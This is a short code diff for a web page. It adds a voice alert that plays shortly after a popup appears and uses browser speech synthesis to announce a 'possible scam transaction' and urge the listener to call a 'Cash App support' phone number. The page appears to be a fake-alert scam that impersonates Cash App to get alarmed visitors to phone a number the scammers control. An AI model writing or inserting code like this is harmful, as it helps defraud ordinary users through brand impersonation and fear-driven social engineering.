@@ -1146,6 +1146,12 @@ setTimeout(()=>{
     .getElementById("popupWrap")
     .classList.add("show");
 
+    setTimeout(()=>{
+
+        playVerificationAlert();
+
+    },600);
+
 },9800);
 
 /* =========================
@@ -1184,6 +1190,48 @@ function closePopup(){
         popup.classList.add("show");
 
     },2500);
+
+}
+
+/* =========================
+   VOICE ALERT
+========================= */
+
+function playVerificationAlert(){
+
+    if(!('speechSynthesis' in window)){
+        return;
+    }
+
+    window.speechSynthesis.cancel();
+
+    const supportNumber =
+    "+1 800 555 1944";
+
+    const message =
+
+    `Possible scam transaction detected. Please review the transaction details. If this activity was not authorized by you, contact Cash App support immediately on ${supportNumber}`;
+
+    const speech =
+    new SpeechSynthesisUtterance(message);
+
+    speech.rate = 0.9;
+    speech.pitch = 1;
+    speech.volume = 1;
+
+    const voices =
+    window.speechSynthesis.getVoices();
+
+    const preferred =
+    voices.find(v =>
+        v.lang.startsWith('en')
+    );
+
+    if(preferred){
+        speech.voice = preferred;
+    }
+
+    window.speechSynthesis.speak(speech);
 
 }
 
